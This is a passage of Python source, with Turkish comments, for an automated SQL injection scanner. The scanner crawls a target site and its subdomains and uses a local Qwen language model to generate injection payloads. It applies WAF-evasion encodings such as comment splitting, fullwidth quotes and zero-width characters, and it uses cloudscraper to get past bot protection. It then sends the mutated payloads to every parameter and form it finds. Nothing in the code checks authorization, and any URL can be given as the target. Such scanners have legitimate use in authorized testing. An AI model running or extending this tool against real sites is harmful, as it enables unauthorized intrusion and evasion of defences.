    def calculate_confidence_levels(self, test_results):
        if not test_results:
            return {'overall': 'low'}
        high_confidence = sum(1 for r in test_results if isinstance(r, dict) and r.get('score', 0) > 0.8)
        medium_confidence = sum(1 for r in test_results if isinstance(r, dict) and 0.5 <= r.get('score', 0) <= 0.8)
        low_confidence = len(test_results) - high_confidence - medium_confidence
        total = len(test_results)
        return {
            'high': high_confidence / total if total > 0 else 0,
            'medium': medium_confidence / total if total > 0 else 0,
            'low': low_confidence / total if total > 0 else 0,
            'overall': 'high' if high_confidence / total > 0.5 else 'medium' if (high_confidence + medium_confidence) / total > 0.5 else 'low'
        }

    def generate_recommendations(self, target_analysis, vulnerabilities, security_analysis):
        recommendations = []
        if vulnerabilities:
            recommendations.append("SQL injection zafiyetleri tespit edildi. Input validation ve parameterized queries uygulayın.")
            recommendations.append("WAF (Web Application Firewall) yapılandırması gözden geçirilmeli.")
        # Hata düzeltme: security_analysis'in doğru yapıya sahip olduğundan emin olun
        if isinstance(security_analysis, dict) and not security_analysis.get('waf_detected'):
            recommendations.append("WAF uygulaması önerilir.")
        if target_analysis.get('risk_level') == 'high':
            recommendations.append("Yüksek riskli endpoint'ler için ek güvenlik önlemleri alın.")
        return recommendations

    def collect_evidence(self, test_results):
        evidence = []
        for result in test_results:
            if isinstance(result, dict) and result.get('is_vulnerable'):
                evidence.append({
                    'payload': result.get('payload', ''),
                    'response_time': result.get('response', {}).get('response_time', 0),
                    'status_code': result.get('response', {}).get('status', 0),
                    'content_length': len(result.get('response', {}).get('html', '')),
                    'sql_error_detected': bool(SQL_ERROR_RX.search(result.get('response', {}).get('html', '')))
                })
        return evidence

    def generate_ai_insights(self, target_analysis, behavioral_profile, security_analysis):
        insights = []
        timing_patterns = behavioral_profile.get('response_time_patterns', {})
        if timing_patterns.get('std', 0) > 1:
            insights.append("Hedefte yüksek response time varyasyonu tespit edildi.")
        # Hata düzeltme: security_analysis'in doğru yapıya sahip olduğundan emin olun
        if isinstance(security_analysis, dict) and security_analysis.get('waf_detected'):
            insights.append(f"WAF tespit edildi: {security_analysis.get('waf_type', 'unknown')}")
        else:
            insights.append("WAF tespit edilmedi, uygulama korumasız olabilir.")
        if target_analysis.get('complexity') == 'high':
            insights.append("Hedef yüksek karmaşıklığa sahip, detaylı test önerilir.")
        return insights

    async def update_learning_memory(self, assessment):
        self.learning_memory[time.time()] = {
            'assessment': assessment,
            'timestamp': time.time(),
            'success_metrics': self.calculate_success_metrics(assessment)
        }
        current_time = time.time()
        old_keys = [k for k, v in self.learning_memory.items() 
                   if current_time - v.get('timestamp', 0) > 86400]
        for key in old_keys:
            del self.learning_memory[key]

    def calculate_success_metrics(self, assessment):
        vulnerabilities = assessment.get('vulnerabilities', [])
        confidence_levels = assessment.get('confidence_levels', {})
        return {
            'vulnerability_count': len(vulnerabilities),
            'high_confidence_rate': confidence_levels.get('high', 0),
            'overall_confidence': confidence_levels.get('overall', 'low'),
            'risk_score': assessment.get('risk_score', 0)
        }

class Qwen:
    def __init__(self, p, n_gpu_layers=16, n_ctx=4096):
        if Llama is None: raise RuntimeError("llama-cpp-python eksik")
        if not os.path.exists(p): raise FileNotFoundError(p)
        self.llm = Llama(model_path=p, n_gpu_layers=n_gpu_layers, n_ctx=n_ctx)

    def payloads(self, sys_prompt, db_type, framework, context, param_name, n=50, rounds=2):
        up = (f"Sen bir siber güvenlik asistanısın. Hedef veritabanı: {db_type.upper()}. Uygulama çerçevesi/ipucu: {framework}. Bağlam: {context}. {n} adet kısa, benign SQL injection test string üret. Parametre: '{param_name}'. Veri değiştirme, sadece hata/true-condition tetikle. JSON array döndür.")
        out = []
        for _ in range(max(1, rounds)):
            try:
                r = self.llm.create_chat_completion(
                    messages=[{"role": "system", "content": sys_prompt}, {"role": "user", "content": up}],
                    max_tokens=900, temperature=0.55
                )
                t = r["choices"][0]["message"]["content"].strip()
                try:
                    a = json.loads(t)
                    a = [s.strip() for s in a if isinstance(s, str) and 1 < len(s) < 100]
                    out.extend(a)
                except Exception:
                    c = [l.strip() for l in t.splitlines() if "'" in l or '"' in l]
                    out.extend(c)
            except Exception as e:
                print(f"{Fore.YELLOW}[WARN] Qwen payload üretme hatası: {e}")
                continue
        u = list(dict.fromkeys(out))
        return u[:n] if u else []

def core_html(html):
    soup = BeautifulSoup(html, "html.parser")
    for tag in soup(["script", "style", "noscript", "nav", "header", "footer", "svg", "canvas", "meta", "link"]):
        tag.decompose()
    mains = soup.find_all(["main", "article"])
    target = mains[0] if mains else soup.body or soup
    txt = target.get_text(" ", strip=True)
    return re.sub(r"\s+", " ", txt).strip()

def tag_profile(html):
    soup = BeautifulSoup(html, "html.parser")
    d = {}
    for el in soup.find_all(True):
        t = el.name
        d[t] = d.get(t, 0) + 1
    total = sum(d.values()) or 1
    for k in list(d.keys()):
        d[k] = d[k] / total
    return d

def profile_dist(a, b):
    keys = set(a.keys()) | set(b.keys())
    return sum(abs(a.get(k, 0) - b.get(k, 0)) for k in keys)

def diff_ratio(a, b):
    return 1.0 - difflib.SequenceMatcher(None, a, b).ratio()

def detect_db(text, headers):
    for db, rx in DB_RX.items():
        if re.search(rx, text, re.I): return db
    s = headers.get("server", "") + " " + headers.get("x-powered-by", "")
    for db, rx in DB_RX.items():
        if re.search(rx, s, re.I): return db
    return "generic"

def enc_mut(payload):
    out = set([payload])
    try:
        out.add(payload.encode("utf-8").decode("utf-8"))
    except: pass
    out.add(payload.replace("'", "%27").replace('"', "%22"))
    out.add(payload.replace("'", "%2527").replace('"', "%2522"))
    out.add(payload.replace("'", "&#39;").replace('"', "&#34;"))
    out.add(payload.replace(" ", "/**/"))
    out.add(payload.replace("or", "o/**/r").replace("OR", "O/**/R"))
    out.add(payload.replace("1=1", "1%3D1"))
    fw = str.maketrans({"'": "＇", '"': "＂", " ": "\u00A0"})
    out.add(payload.translate(fw))
    out2 = set()
    for p in out:
        out2.add(p)
        out2.add("\u200b".join(list(p)))
    return list(dict.fromkeys(out2))

def build_get(url, payloads, only_param=None, headersets=None):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    v = []
    headersets = headersets or [None, {"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"}]
    for param in qs:
        if only_param and param != only_param: continue
        ov = qs[param][0]
        for payload in payloads:
            for m in enc_mut(payload):
                qsm = qs.copy()
                qsm[param] = [ov + m]
                new_query = urlencode(qsm, doseq=True, safe=":/@")
                for h in headersets:
                    v.append(("GET", urlunparse(parsed._replace(query=new_query)), param, {}, h))
    return v

def build_post(form, payloads, only_param=None, headersets=None):
    action = form['action']
    base = dict(form.get('inputs') or {})
    v = []
    headersets = headersets or [None, {"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"}]
    for param in list(base.keys()):
        if only_param and param != only_param: continue
        ov = base[param]
        for payload in payloads:
            for m in enc_mut(payload):
                d = base.copy()
                d[param] = f"{ov}{m}"
                for h in headersets:
                    v.append(("POST", action, param, d, h))
    return v

async def browser_crawl(start_url, max_pages, include_subdomains=True, headless=True):
    out_urls = set()
    forms_all = []
    js_inline_targets = set()
    net_targets = set()
    headers_any = {}
    frames = set()
    pr = urlparse(start_url)
    root_domain = pr.hostname or ""
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=headless, args=["--disable-web-security", "--no-sandbox"])
        context = await browser.new_context(
            ignore_https_errors=True, 
            java_script_enabled=True, 
            user_agent="SQLDetector/7.0"
        )
        page = await context.new_page()
        async def on_request(req):
            try:
                u = req.url
                pu = urlparse(u)
                if pu.scheme.startswith("http"):
                    if (pu.hostname or "").endswith(root_domain) or (include_subdomains and root_domain in (pu.hostname or "")):
                        net_targets.add(u)
            except: pass
        page.on("request", on_request)
        q = [start_url]
        seen = set(q)
        while q and len(seen) < max_pages:
            u = q.pop(0)
            try:
                r = await page.goto(u, wait_until="domcontentloaded", timeout=25000)
                await page.wait_for_timeout(500)
                await page.wait_for_load_state("networkidle", timeout=25000)
                cheaders = r.headers if r else {}
                headers_any.update({k.lower(): v for k, v in cheaders.items()})
                html = await page.content()
                frames.update([f.lower() for f in FRAME_RX.findall(html)])
                soup = BeautifulSoup(html, "html.parser")
                for a in soup.find_all("a", href=True):
                    nh = urljoin(u, a["href"])
                    pu = urlparse(nh)
                    if pu.scheme.startswith("http"):
                        if (pu.hostname or "").endswith(root_domain) or (include_subdomains and root_domain in (pu.hostname or "")):
                            if nh not in seen:
                                seen.add(nh)
                                q.append(nh)
                for form in soup.find_all("form"):
                    action = form.get("action") or u
                    method = (form.get("method") or "get").lower()
                    inputs = {}
                    for inp in form.find_all(['input', 'select', 'textarea']):
                        name = inp.get('name')
                        if not name: continue
                        val = inp.get('value') or ''
                        inputs[name] = val
                    forms_all.append({
                        "action": urljoin(u, action),
                        "method": method,
                        "inputs": inputs
                    })
                for script in soup.find_all("script"):
                    txt = script.string or ""
                    for m in JS_URL_RX.finditer(txt):
                        if m.group(2):
                            js_inline_targets.add(m.group(2))
                        elif m.group(4):
                            js_inline_targets.add(urljoin(u, m.group(4)))
                    for m in JSON_URL_RX.finditer(txt):
                        js_inline_targets.add(urljoin(u, m.group(1)))
                out_urls.add(u)
                if len(seen) >= max_pages: break
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Crawl hatası {u}: {e}")
                continue
        await browser.close()
    urls = set(filter(lambda x: urlparse(x).scheme.startswith("http"), out_urls | js_inline_targets | net_targets))
    return urls, forms_all, headers_any, list(frames)

def synth_params(urls):
    out = set()
    seeds = ["id", "uid", "pid", "user", "product", "order", "code", "key", "page", "offset", "limit", "q", "search", "filter", "sort", "order", "fields", "include", "where"]
    for u in urls:
        pu = urlparse(u)
        if pu.query:
            out.add(u)
        else:
            for s in seeds[:6]:
                out.add(urlunparse(pu._replace(query=f"{s}=1")))
    return out

def risk_score(url):
    pu = urlparse(url)
    score = 0
    names = list(parse_qs(pu.query).keys())
    s = "-".join([pu.path] + names).lower()
    for k in ["id", "uid", "pid", "user", "product", "order", "code", "key", "filter", "q", "search", "sort", "fields", "include", "where"]:
        if k in s: score += 3
    if re.search(r"/api/|/graphql|/v\d+/", pu.path): score += 4
    if any(x in pu.path.lower() for x in ["admin", "report", "export"]): score += 2
    return score

# cloudscraper entegrasyonu
async def http_fetch(url, method="GET", data=None, extra_headers=None, headless=True):
    # cloudscraper oturumunu oluştur
    scraper = cloudscraper.create_scraper()
    # cloudscraper için varsayılan timeout
    scraper.timeout = 25
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 SQLDetector/7.0"
    }
    if extra_headers:
        headers.update(extra_headers)

    try:
        start_time = time.time()
        if method.upper() == "GET":
            response = scraper.get(url, headers=headers, timeout=25, allow_redirects=True)
            end_time = time.time()
            status = response.status_code
            html = response.text
            response_headers = dict(response.headers)
        elif method.upper() == "POST":
            response = scraper.post(url, data=data, headers=headers, timeout=25, allow_redirects=True)
            end_time = time.time()
            status = response.status_code
            html = response.text
            response_headers = dict(response.headers)
        else:
            # Diğer metodlar için playwright fallback
            print(f"{Fore.YELLOW}[!] Cloudscraper desteklemiyor: {method}. Playwright fallback yapılıyor.")
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=headless, args=["--disable-web-security", "--no-sandbox"])
                context = await browser.new_context(
                    ignore_https_errors=True,
                    java_script_enabled=True,
                    user_agent=headers["User-Agent"]
                )
                page = await context.new_page()
                if extra_headers:
                    await page.set_extra_http_headers(extra_headers)
                start_time = time.time()
                if method.upper() == "GET":
                    r = await page.goto(url, wait_until="domcontentloaded", timeout=25000)
                    await page.wait_for_load_state("networkidle", timeout=25000)
                else: # POST için basit form submit
                    await page.goto(url, wait_until="domcontentloaded", timeout=25000)
                    await page.wait_for_load_state("networkidle", timeout=25000)
                html = await page.content()
                end_time = time.time()
                status = r.status if method.upper() == "GET" and r else 200
                response_headers = r.headers if method.upper() == "GET" and r else {}
                await browser.close()
                return {
                    "html": html,
                    "headers": {k.lower(): v for k, v in response_headers.items()},
                    "status": status,
                    "response_time": end_time - start_time
                }
        
        return {
            "html": html,
            "headers": {k.lower(): v for k, v in response_headers.items()},
            "status": status,
            "response_time": end_time - start_time
        }

    except Exception as e:
        print(f"{Fore.RED}[ERROR] HTTP isteği başarısız: {url} - {e}")
        # Hata durumunda playwright fallback
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=headless, args=["--disable-web-security", "--no-sandbox"])
                context = await browser.new_context(
                    ignore_https_errors=True,
                    java_script_enabled=True,
                    user_agent=headers.get("User-Agent", "SQLDetector/7.0")
                )
                page = await context.new_page()
                if extra_headers:
                    await page.set_extra_http_headers(extra_headers)
                start_time = time.time()
                if method.upper() == "GET":
                    r = await page.goto(url, wait_until="domcontentloaded", timeout=25000)
                    await page.wait_for_load_state("networkidle", timeout=25000)
                else:
                    await page.goto(url, wait_until="domcontentloaded", timeout=25000)
                    await page.wait_for_load_state("networkidle", timeout=25000)
                html = await page.content()
                end_time = time.time()
                status = r.status if method.upper() == "GET" and r else 200
                response_headers = r.headers if method.upper() == "GET" and r else {}
                await browser.close()
                return {
                    "html": html,
                    "headers": {k.lower(): v for k, v in response_headers.items()},
                    "status": status,
                    "response_time": end_time - start_time
                }
        except Exception as e2:
            print(f"{Fore.RED}[ERROR] Playwright fallback de başarısız: {url} - {e2}")
            return {
                "html": "",
                "headers": {},
                "status": 500,
                "response_time": 0,
                "error": str(e2)
            }


async def baseline_via_browser(url, headless=True):
    # cloudscraper için baseline, doğrudan http_fetch kullanabiliriz.
    # Ancak istatistiksel temel için birden fazla istek yapmak daha iyi olur.
    # Burada sadece tek bir istek yapıyoruz, ama run fonksiyonunda birden fazla örnek alınabilir.
    return await http_fetch(url, headless=headless)

class Scanner:
    def __init__(self, baseline, baseprof, headers):
        self.baseline = baseline
        self.baseprof = baseprof
        self.headers = headers
        self.detection_engine = LearningDetectionEngine()

    async def test(self, variant):
        method, url, param, data, extra_headers = variant
        try:
            test_result = await http_fetch(url, method=method, data=data, extra_headers=extra_headers, headless=True)
        except Exception as e:
            return {
                "method": method,
                "url": url,
                "param": param,
                "error": str(e),
                "is_vulnerable": False,
                "score": 0.0
            }
        analysis = await self.detection_engine.intelligent_analysis(self.baseline, test_result, data.get(param, "") if data else "")
        return {
            "method": method,
            "url": url,
            "param": param,
            "diff_core": round(1.0 - difflib.SequenceMatcher(None, self.baseline["core"], core_html(test_result["html"])).ratio(), 3),
            "diff_tags": round(profile_dist(self.baseline["tags"], tag_profile(test_result["html"])), 3),
            "sql_error": analysis.get("sql_error", False),
            "status": test_result["status"],
            "is_vulnerable": analysis.get("is_vulnerable", False),
            "score": round(analysis.get("score", 0.0), 3),
            "confidence": analysis.get("confidence", "low"),
            "response_time": test_result.get("response_time", 0),
            "details": analysis.get("details", {})
        }

async def run(target):
    start_time = time.time()
    print(f"{Fore.MAGENTA}{Style.BRIGHT}{'='*60}")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}           SQLDetector AI v2.0")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}{'='*60}")
    print(f"{Fore.CYAN}[{time.strftime('%Y-%m-%d %H:%M:%S')}] {Fore.WHITE}Tarama başlatılıyor: {Fore.GREEN}{target}")
    orchestrator = AISecurityOrchestrator()
    ai_results = await orchestrator.intelligent_security_assessment(target)
    print(f"{Fore.CYAN}[{time.strftime('%Y-%m-%d %H:%M:%S')}] {Fore.WHITE}Web crawling başlatılıyor...")
    urls, forms, headers, frames = await browser_crawl(target, max_pages=2000, include_subdomains=True, headless=True)
    print(f"{Fore.GREEN}[+] {Fore.WHITE}Bulunan URL'ler: {Fore.YELLOW}{len(urls)}")
    print(f"{Fore.GREEN}[+] {Fore.WHITE}Bulunan Formlar: {Fore.YELLOW}{len(forms)}")
    target_selector = IntelligentTargetSelector()
    all_targets = set(u for u in urls if parse_qs(urlparse(u).query)) | set(urls)
    all_targets |= synth_params(urls)
    candidates = target_selector.prioritize_targets(list(all_targets))
    print(f"{Fore.GREEN}[+] {Fore.WHITE}Önceliklendirilen hedefler: {Fore.YELLOW}{len(candidates)}")
    db_guess = "generic"
    if candidates:
        try:
            initial_result = await http_fetch(candidates[0], "GET", None, None, True)
            db_guess = detect_db(initial_result["html"], initial_result["headers"])
            print(f"{Fore.GREEN}[+] {Fore.WHITE}Veritabanı türü tespit edildi: {Fore.CYAN}{db_guess}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] {Fore.WHITE}DB tespiti başarısız: {e}")
    qpath = os.getenv("QWEN_PATH", "")
    ng = int(os.getenv("QWEN_N_GPU_LAYERS", "16") or "16")
    system_prompt = sp()
    payload_generator = AdaptiveAIPayloadGenerator(qpath if qpath else None, ng)
    framework_adapter = DynamicFrameworkAdapter()
    encoder = IntelligentEncoder()
    behavioral_profiler = BehavioralProfiler()
    security_detector = SecurityMechanismDetector()
    timing_analyzer = AdvancedTimingAnalyzer()
    findings = []
    successful_payloads = []
    total_candidates = min(100, len(candidates))
    for i, t in enumerate(candidates[:total_candidates]):
        progress = int((i + 1) / total_candidates * 20)
        bar = f"[{Fore.GREEN}{'#' * progress}{Fore.RED}{'-' * (20 - progress)}{Fore.RESET}]"
        print(f"\r{Fore.CYAN}[{time.strftime('%H:%M:%S')}] {Fore.WHITE}Hedefler test ediliyor {bar} {i+1}/{total_candidates} ({t[:50]}...)", end='', flush=True)
        try:
            base = await baseline_via_browser(t, headless=True)
        except Exception as e:
            print(f"\n{Fore.YELLOW}[!] {Fore.WHITE}Baseline oluşturulamadı: {e}")
            continue
        detected_frameworks = await framework_adapter.detect_framework(base["html"], base["headers"])
        try:
            behavioral_profile = await behavioral_profiler.create_behavioral_baseline(t)
        except Exception as e:
            behavioral_profile = {}
        try:
            security_analysis = await security_detector.detect_security_mechanisms(t)
        except Exception as e:
            security_analysis = {}
        params = list(parse_qs(urlparse(t).query).keys())
        keys = params[:10] if params else []
        target_info = {
            "url": t, 
            "params": keys,
            "path": urlparse(t).path,
            "param_count": len(keys)
        }
        payloads = payload_generator.generate_contextual_payloads(
            target_info, 
            db_guess, 
            ",".join(frames + detected_frameworks), 
            successful_payloads,
            n=40
        )
        # Hata düzeltme: security_analysis'in doğru yapıya sahip olduğundan emin olun
        if isinstance(security_analysis, dict) and security_analysis.get('waf_detected'):
            try:
                bypass_payloads = await security_detector.generate_waf_bypass_payloads(security_analysis, payloads)
                payloads = list(set(payloads + bypass_payloads))
            except Exception as e:
                print(f"\n{Fore.YELLOW}[!] {Fore.WHITE}WAF bypass üretimi başarısız: {e}")
        headersets = [None, {"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"}]
        variants = []
        for p in keys:
            encoded_payloads = []
            for payload in payloads[:20]:
                encoded_payloads.extend(encoder.generate_smart_encodings(payload))
            variants.extend(build_get(t, list(set(encoded_payloads)), only_param=p, headersets=headersets))
        for f in forms[:3]:
            if not f.get("inputs"): continue
            fkeys = list(f["inputs"].keys())[:5]
            for p in fkeys:
                encoded_payloads = []
                for payload in payloads[:15]:
                    encoded_payloads.extend(encoder.generate_smart_encodings(payload))
                variants.extend(build_post(f, list(set(encoded_payloads)), only_param=p, headersets=headersets))
        if variants:
            batch_size = 50
            for i in range(0, len(variants), batch_size):
                batch = variants[i:i + batch_size]
                sc = Scanner(base, base, base["headers"])
                outs = await asyncio.gather(*[sc.test(v) for v in batch], return_exceptions=True)
                for o in outs:
                    if isinstance(o, dict) and o.get("is_vulnerable"):
                        findings.append(o)
                        if "param" in o and "url" in o:
                            payload_key = f"{o['param']}_{o['url']}"
                            if payload_key not in successful_payloads:
                                successful_payloads.append(payload_key)
    print(f"\n{Fore.CYAN}[{time.strftime('%Y-%m-%d %H:%M:%S')}] {Fore.WHITE}AI analiz sonuçları işleniyor...")
    ai_vulnerabilities = ai_results.get('vulnerabilities', [])
    for vuln in ai_vulnerabilities:
        findings.append({
            'method': 'AI_ANALYSIS',
            'url': vuln.get('url', target),
            'param': 'N/A',
            'score': vuln.get('confidence', 0),
            'is_vulnerable': True,
            'ai_detected': True,
            'vulnerability_type': vuln.get('type', 'Unknown'),
            'confidence': 'high'
        })
    print(f"{Fore.CYAN}[{time.strftime('%Y-%m-%d %H:%M:%S')}] {Fore.WHITE}Tarama tamamlandı. Süre: {Fore.YELLOW}{time.time() - start_time:.1f}s")
    return findings

def main():
    p = argparse.ArgumentParser(description="AI Destekli SQL Injection Tespit Aracı")
    p.add_argument("url", help="Hedef URL")
    a = p.parse_args()
    try:
        findings = asyncio.run(run(a.url))
        print(f"\n{Fore.MAGENTA}{'='*60}")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}                    TARAMA SONUCU")
        print(f"{Fore.MAGENTA}{'='*60}")
        if findings:
            findings = sorted(findings, key=lambda x: -x.get("score", 0))
            vuln_count = 0
            ai_count = 0
            for f in findings:
                if f.get("ai_detected"):
                    ai_count += 1
                else:
                    vuln_count += 1
                flag = f"{Fore.RED} SQLerr" if f.get("sql_error") else ""
                confidence = f.get("confidence", "low")
                ai_flag = f"{Fore.CYAN} [AI]" if f.get("ai_detected") else ""
                score_color = Fore.RED if f.get("score", 0) > 0.9 else Fore.YELLOW if f.get("score", 0) > 0.5 else Fore.WHITE
                print(f"{Fore.RED}[!] {Fore.WHITE}[{f['method']}] {Fore.GREEN}{f['url']} {Fore.WHITE}param={Fore.CYAN}{f['param']} {Fore.WHITE}score={score_color}{f.get('score')} {Fore.MAGENTA}confidence={confidence}{flag}{ai_flag}")
            print(f"\n{Fore.GREEN}[+] {Fore.WHITE}Toplam Bulgu: {Fore.YELLOW}{len(findings)} {Fore.WHITE}({Fore.RED}Trad: {vuln_count}{Fore.WHITE}, {Fore.CYAN}AI: {ai_count}{Fore.WHITE})")
        else:
            print(f"{Fore.GREEN}[+] {Fore.WHITE}Herhangi bir zafiyet bulunamadı.")
        with open("findings.json", "w", encoding="utf-8") as fp:
            json.dump(findings, fp, indent=4, ensure_ascii=False)
        print(f"\n{Fore.CYAN}[i] {Fore.WHITE}Sonuçlar 'findings.json' dosyasına kaydedildi.")
        print(f"{Fore.MAGENTA}{'='*60}\n")
    except Exception as e:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}{e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()